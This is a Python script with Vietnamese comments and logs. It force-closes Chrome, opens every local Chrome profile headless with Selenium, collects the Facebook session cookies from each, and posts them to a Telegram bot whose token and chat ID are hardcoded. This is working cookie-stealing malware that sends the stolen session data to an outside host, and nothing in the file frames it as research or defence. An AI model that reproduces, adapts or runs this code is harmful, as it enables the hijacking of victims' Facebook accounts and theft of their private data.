import os
import sys
import subprocess
import logging
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import requests

# Thiết lập logging
logging.basicConfig(
    level=logging.INFO,
    filename='ScriptLog.log',
    format='%(asctime)s - %(levelname)s - %(message)s'
)

# Thông tin Telegram
TOKEN = '7533821284:AAGDsLUDpZYbfzdghq8QihpeHXfhzGIP43I'
CHAT_ID = '1174455752'
TELEGRAM_API = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage'

def install_libraries():
    required_libs = [
        "certifi", "charset_normalizer", "idna", "urllib3", "requests",
        "tqdm", "python_dotenv", "webdriver_manager", "selenium"
    ]

    # Đảm bảo pip được cài đặt
    logging.info("Đang kiểm tra và cài đặt pip...")
    subprocess.run([sys.executable, "-m", "ensurepip", "--upgrade"], check=True)
    subprocess.run([sys.executable, "-m", "pip", "install", "--upgrade", "pip"], check=True)

    # Cài đặt các thư viện từ PyPI
    logging.info("Đang kiểm tra và cài đặt các thư viện cần thiết từ PyPI...")
    for lib in required_libs:
        logging.info("Đang kiểm tra " + lib + "...")
        result = subprocess.run(
            [sys.executable, "-c", "import " + lib],
            capture_output=True,
            text=True
        )
        if result.returncode != 0:
            logging.info("Thư viện " + lib + " chưa được cài đặt, đang cài đặt từ PyPI...")
            install_result = subprocess.run(
                [sys.executable, "-m", "pip", "install", lib],
                capture_output=True,
                text=True
            )
            if install_result.returncode == 0:
                logging.info("Cài đặt " + lib + " từ PyPI thành công")
            else:
                logging.error("Lỗi khi cài đặt " + lib + " từ PyPI: " + install_result.stderr)
                raise RuntimeError("Không thể cài đặt thư viện " + lib + " từ PyPI: " + install_result.stderr)
        else:
            logging.info("Thư viện " + lib + " đã được cài đặt, bỏ qua.")

def close_chrome():
    logging.info("Đang đóng tất cả tiến trình Chrome...")
    try:
        subprocess.run("taskkill /F /IM chrome.exe", shell=True, creationflags=0x08000000)
        logging.info("Đã đóng Chrome thành công")
    except Exception as e:
        logging.error("Lỗi khi đóng Chrome: " + str(e))

def check_chrome_installed():
    possible_paths = [
        os.path.join(os.getenv("ProgramFiles", "C:\\Program Files"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("ProgramFiles(x86)", "C:\\Program Files (x86)"), "Google", "Chrome", "Application", "chrome.exe"),
        os.path.join(os.getenv("LOCALAPPDATA", "C:\\Users\\<Tên_Người_Dùng>\\AppData\\Local").replace("<Tên_Người_Dùng>", os.getenv("USERNAME")), "Google", "Chrome", "Application", "chrome.exe"),
    ]

    for chrome_path in possible_paths:
        if os.path.exists(chrome_path):
            logging.info("Chrome đã được cài đặt tại: " + chrome_path)
            return True

    logging.error("Chrome không được cài đặt trên máy!")
    print("Chrome không được cài đặt trên máy. Vui lòng cài đặt Chrome trước khi chạy script.")
    return False

def get_chrome_profiles():
    user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    profiles = []
    if os.path.exists(user_data_dir):
        for item in os.listdir(user_data_dir):
            if os.path.isdir(os.path.join(user_data_dir, item)) and (item.startswith("Profile ") or item == "Default"):
                profiles.append(item)
    logging.info("Danh sách profile Chrome: " + str(profiles))
    return profiles

def get_cookies_from_profile(profile_name):
    logging.info("Bắt đầu lấy cookies từ profile " + profile_name)

    options = Options()
    options.add_argument('--headless=new')
    options.add_argument('--no-sandbox')
    options.add_argument('--disable-dev-shm-usage')
    options.add_argument('--disable-gpu')

    user_data_dir = os.path.join(os.getenv("LOCALAPPDATA"), "Google", "Chrome", "User Data")
    if not os.path.exists(os.path.join(user_data_dir, profile_name)):
        logging.error("Profile " + profile_name + " không tồn tại!")
        return None

    options.add_argument("user-data-dir=" + user_data_dir)
    options.add_argument("profile-directory=" + profile_name)

    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
        logging.info("Khởi động ChromeDriver thành công")
    except Exception as e:
        logging.error("Lỗi khi khởi động ChromeDriver: " + str(e))
        return None

    try:
        driver.get('https://www.facebook.com/')
        WebDriverWait(driver, 5).until(EC.presence_of_element_located((By.TAG_NAME, "body")))
        cookies = driver.get_cookies()
        filtered_cookies = []
        for c in cookies:
            if 'facebook.com' in c['domain']:
                filtered_cookies.append(c)
        logging.info("Lấy được " + str(len(filtered_cookies)) + " cookies từ profile " + profile_name)
        return filtered_cookies
    except Exception as e:
        logging.error("Lỗi khi lấy cookies từ profile " + profile_name + ": " + str(e))
        return None
    finally:
        driver.quit()
        logging.info("Đã đóng ChromeDriver cho profile " + profile_name)

def cookies_to_header_string(cookies):
    if not cookies:
        logging.warning("Không có cookies!")
        return "Không có cookies!"
    cookie_string = ""
    for i, cookie in enumerate(cookies):
        if i > 0:
            cookie_string += "; "
        cookie_string += cookie['name'] + "=" + cookie['value']
    logging.info("Chuỗi cookies: " + cookie_string)
    return cookie_string

def send_telegram(profile_cookies):
    message = ""
    for profile in profile_cookies:
        cookies = profile_cookies[profile]
        message += "Profile: " + profile + "\n"
        message += cookies_to_header_string(cookies) + "\n\n"
    if not message:
        message = "Không lấy được cookies từ bất kỳ profile nào!"
    logging.info("Chuẩn bị gửi tin nhắn Telegram: " + message)
    try:
        response = requests.post(TELEGRAM_API, data={'chat_id': CHAT_ID, 'text': message})
        if response.status_code == 200:
            logging.info("Gửi tin nhắn Telegram thành công")
        else:
            logging.error("Gửi tin nhắn Telegram thất bại: " + response.text)
    except Exception as e:
        logging.error("Lỗi khi gửi tin nhắn Telegram: " + str(e))

if __name__ == "__main__":
    logging.info("Bắt đầu chạy script")

    # Cài đặt thư viện
    try:
        install_libraries()
    except Exception as e:
        logging.error("Lỗi khi cài đặt thư viện: " + str(e))
        sys.exit(1)

    if not check_chrome_installed():
        sys.exit(1)

    close_chrome()

    profiles = get_chrome_profiles()
    profile_cookies = {}
    for profile in profiles:
        logging.info("Xử lý profile " + profile + "...")
        cookies = get_cookies_from_profile(profile)
        if cookies:
            profile_cookies[profile] = cookies
        logging.info("Hoàn tất xử lý profile " + profile)

    send_telegram(profile_cookies)
    logging.info("Kết thúc script")